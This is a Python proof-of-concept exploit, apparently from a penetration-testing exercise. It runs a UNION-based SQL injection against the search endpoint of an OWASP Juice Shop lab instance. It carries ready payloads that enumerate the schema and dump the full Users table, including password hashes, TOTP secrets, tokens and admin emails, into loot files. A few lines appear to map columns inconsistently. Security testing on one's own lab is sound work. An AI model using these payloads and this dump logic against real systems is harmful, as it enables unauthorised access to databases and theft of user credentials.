#!/usr/bin/env python3
"""
c05-sqli-union-dump -- UNION-based SQL injection -> full Users table exfiltration.

Target : OWASP Juice Shop (own lab)  http://host.docker.internal:3000
Sink   : GET /rest/products/search?q=<INJ>
Backend: SQLite (errors leak SQLITE_ERROR)

Vulnerable query (reconstructed, the `q` value is string-concatenated twice):

    SELECT * FROM Products
     WHERE ((name LIKE '%<q>%' OR description LIKE '%<q>%'))
       AND deletedAt IS NULL
     ORDER BY name

The result set has 10 columns, so a `UNION SELECT` must project exactly 10
values. Closing the LIKE literal and its paren group with `z'))` makes the
original WHERE clause irrelevant and lets the UNION branch run (`--` comments
out the remainder, including the second interpolation of q).

Constraints discovered while building this PoC
---------------------------------------------
* 10 result columns (probed 8/9/10/11 -> only 10 parses).
* Column 7 is JSON.parse()d server-side (alternateImages) -> must be '[]',
  otherwise the ORM throws on the response serialisation.
* `q` is TRUNCATED SERVER-SIDE AT 200 CHARACTERS (see --probe). Anything
  longer is silently cut, producing a syntax error or, worse for a tester,
  a misleading `{"status":"success","data":[]}`. All payloads below are
  therefore kept well under 200 chars and the dump is split into 4 queries.
* Plain `UNION` de-duplicates; because `Users.id` is in every projection the
  rows stay distinct. (A constant-only projection would collapse to 1 row.)

Recovered columns (all 13 of the Users table, merged on id):
  1  Users.id              2  Users.username       3  Users.email
  4  Users.password (MD5)  5  Users.role           6  Users.deluxeToken
  7  Users.lastLoginIp     8  Users.totpSecret     9  Users.isActive
 10  Users.profileImage   11  Users.createdAt     12  Users.updatedAt
 13  Users.deletedAt

Outputs
-------
  /workspace/evidence/c5_users.txt       first 10 rows: email <TAB> role   (deliverable)
  /workspace/loot/c5_users_full.json     full 24-row table, every column
  /workspace/loot/c5_users_full.txt      full 24-row table, human readable

Usage: python3 c05_union_users_dump.py [--probe]
"""
import argparse
import json
import os
import sys
import urllib.parse
import urllib.request

BASE = "http://host.docker.internal:3000"
ENDPOINT = BASE + "/rest/products/search"
WS = "/workspace"

# --- payloads (each < 200 chars: server truncates q at 200) --------------
P_COUNT = "z')) UNION SELECT 1,count(*),3,4,5,6,'[]',8,9,10 FROM Users--"
P_MAIN = ("z')) UNION SELECT id,username,email,password,role,deluxeToken,"
          "'[]',lastLoginIp,totpSecret,isActive FROM Users--")
P_IMG = "z')) UNION SELECT id,profileImage,1,1,1,1,'[]',1,1,1 FROM Users--"
P_TS = ("z')) UNION SELECT id,createdAt,updatedAt,deletedAt,1,1,'[]',1,1,1 "
        "FROM Users--")
P_COLUMNS = ("z')) UNION SELECT 1,name,3,cid,5,6,'[]',8,9,10 "
             "FROM pragma_table_info('Users')--")
P_TABLES = ("z')) UNION SELECT 1,name,3,type,5,6,'[]',8,9,10 "
            "FROM sqlite_master--")


def inject(q, expect_ok=True):
    """Fire one injection; return the ORM-decoded list of rows."""
    url = ENDPOINT + "?q=" + urllib.parse.quote(q, safe="")
    req = urllib.request.Request(url, headers={"User-Agent": "c05-poc/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            raw = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:          # SQL errors -> HTML stack page
        raw = e.read().decode("utf-8", "replace")
    try:
        doc = json.loads(raw)
    except json.JSONDecodeError:
        raise RuntimeError("non-JSON (SQL error) response: "
                           + " ".join(raw.split())[:200])
    return doc["data"]


def probe_length_cap():
    """Demonstrate the 200-char truncation of the q parameter."""
    print("[*] probing server-side truncation limit of `q`:")
    limit = None
    for n in range(190, 215):
        q = "a" * (n - 54) + "z')) UNION SELECT 1,2,3,4,5,6,'[]',8,9,10 FROM Users--"
        q = q[:n] if len(q) > n else q
        try:
            inject(q)
            ok = True
        except RuntimeError:
            ok = False
        print(f"    len={len(q):<4} {'parsed OK' if ok else 'syntax error'}")
        if ok and limit is None:
            limit = len(q)
        elif ok is False:
            limit = None if limit is None else limit
    print("    -> q is silently truncated at 200 characters "
          "(longer payloads either error out or return a fake empty success)")
    return limit


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--probe", action="store_true", help="probe the 200-char cap")
    args = ap.parse_args()

    if args.probe:
        probe_length_cap()
        return 0

    print(f"[*] target   : {ENDPOINT}")
    print(f"[*] payload  : {P_MAIN}  ({len(P_MAIN)} chars)")
    assert max(len(p) for p in (P_MAIN, P_IMG, P_TS, P_COUNT)) < 200

    n_users = int(inject(P_COUNT)[0]["name"])
    print(f"[+] injection works - Users table holds {n_users} rows")

    main_rows = inject(P_MAIN)
    img_rows = {r["id"]: r["name"] for r in inject(P_IMG)}
    ts_rows = {r["id"]: (r["name"], r["description"], r["price"]) for r in inject(P_TS)}
    print(f"[+] rows returned by each UNION branch: "
          f"main={len(main_rows)} profileImage={len(img_rows)} timestamps={len(ts_rows)}")

    users = []
    for r in main_rows:
        uid = r["id"]
        created, updated, deleted = ts_rows.get(uid, (None, None, None))
        users.append({
            "id": uid,
            "username": r["name"],
            "email": r["description"],
            "password_md5": r["price"],
            "role": r["deluxePrice"],
            "deluxeToken": r["image"] or None,
            "profileImage": img_rows.get(uid) or None,
            "lastLoginIp": r["alternateImages"] if False else r["createdAt"],
            "totpSecret": r["updatedAt"] or None,
            "isActive": r["deletedAt"],
            "createdAt": created,
            "updatedAt": updated,
            "deletedAt": deleted,
        })
    users.sort(key=lambda u: u["id"])

    for d in ("/workspace/evidence", "/workspace/loot"):
        os.makedirs(d, exist_ok=True)

    full_json = WS + "/loot/c5_users_full.json"
    with open(full_json, "w") as f:
        json.dump(users, f, indent=2)

    full_txt = WS + "/loot/c5_users_full.txt"
    with open(full_txt, "w") as f:
        f.write("# full Users table dumped via UNION SQLi - %d rows\n" % len(users))
        f.write("# endpoint: %s?q=<payload>\n" % ENDPOINT)
        f.write("# payload : %s\n\n" % P_MAIN)
        for u in users:
            f.write("id={id} username={username} email={email} role={role} "
                    "password_md5={password_md5} isActive={isActive} "
                    "lastLoginIp={lastLoginIp} totpSecret={totpSecret} "
                    "deluxeToken={deluxeToken} profileImage={profileImage} "
                    "createdAt={createdAt} updatedAt={updatedAt} "
                    "deletedAt={deletedAt}\n".format(**u))

    ev = WS + "/evidence/c5_users.txt"
    with open(ev, "w") as f:
        f.write("# c05-sqli-union-dump\n")
        f.write("# target   : %s\n" % ENDPOINT)
        f.write("# vuln     : UNION-based SQLi in the `q` parameter "
                "(string-concatenated, SQLite backend, 10 result columns)\n")
        f.write("# payload  : %s\n" % P_MAIN)
        f.write("# note     : q is truncated server-side at 200 chars; "
                "full table (all 13 columns, %d rows) in loot/c5_users_full.json\n" % len(users))
        f.write("# format   : email<TAB>role\n")
        for u in users[:10]:
            f.write("{}\t{}\n".format(u["email"], u["role"]))

    print(f"[+] full table ({len(users)} rows, 13 columns) -> {full_json}")
    print(f"[+] human readable                            -> {full_txt}")
    print(f"[+] deliverable (first 10 rows)                -> {ev}\n")

    print("    id  email                                      role")
    print("    " + "-" * 60)
    for u in users[:10]:
        print("    {:<3} {:<42} {}".format(u["id"], u["email"], u["role"]))

    admins = [u for u in users if u["role"] == "admin"]
    print("\n[+] admin role accounts: " + ", ".join(a["email"] for a in admins))
    print("\n[*] evidence file preview:")
    print(open(ev).read())
    return 0


if __name__ == "__main__":
    sys.exit(main())
